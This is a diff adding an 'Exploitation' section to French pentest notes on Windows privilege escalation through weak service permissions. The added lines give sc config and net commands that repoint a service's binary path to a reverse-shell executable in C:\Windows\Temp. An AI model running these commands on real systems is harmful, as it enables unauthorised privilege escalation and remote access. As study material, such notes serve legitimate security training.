@@ -18,6 +18,19 @@ Il faut regarder les sections suivantes :
 ===========(Applications Information)================
 ```
 
+## Exploitation
+
+### Permissions de modifier un service
+Si on peut modifier un service, on pourra remplacer le processus lancé par un reverse shell.
+
+#### Modification
+```shell
+net stop MyVulnSVC
+sc config MyVulnSVC binpath= "\"C:\Windows\Temp\reverse.exe\""
+net start MyVulnSVC
+```
+
+
 ## Trouver un service vulnérable (manuel)
 
 ### Lister les services
